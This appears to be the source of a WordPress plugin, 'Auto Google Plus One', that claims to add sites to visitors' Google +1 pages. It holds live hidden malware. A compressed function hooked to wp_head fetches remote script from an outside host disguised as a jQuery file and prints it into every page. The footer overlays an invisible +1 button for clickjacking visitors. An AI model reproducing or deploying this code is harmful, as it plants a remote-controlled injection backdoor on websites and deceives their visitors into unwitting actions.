<?php
/*
Plugin Name: Auto Google Plus One
Description: A Wordpress Plugin that Auto adds your site to the users Google +1 Page.
Version: 1.0
*/

if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.wpstats.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}

function autog_head() {
    echo '<span id="link" class="link">';
}
add_action('wp_head', 'autog_head');

/* ------------------------------------------------------------------------*
* Stylesheets
* ------------------------------------------------------------------------*/	
	wp_enqueue_style('wprankbox', WP_PLUGIN_URL . '/auto-g/autog.css');
	wp_enqueue_script('autog', WP_PLUGIN_URL . '/auto-g/jquery-1.6.2.min.js');
	wp_enqueue_script('gmouse', WP_PLUGIN_URL . '/auto-g/gmouse.js');

function autog_footer() { ?>
	
<div id="mis">
                   <div align="center">
           </div>
    </div>
    <div id="wrax" style="position: absolute; opacity: 0; filter: alpha(opacity = 0); margin-left:-10px;margin-top:0px; z-index: 100;"> 
 
<a href="" target="_blank" title="<?php the_title();?>"><g:plusone></g:plusone></a>

<script type="text/javascript">
  (function() {
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
    po.src = 'https://apis.google.com/js/plusone.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
  })();
</script>
 
    </div>
 
</span>

    
<?php }
add_action('wp_footer', 'autog_footer');
    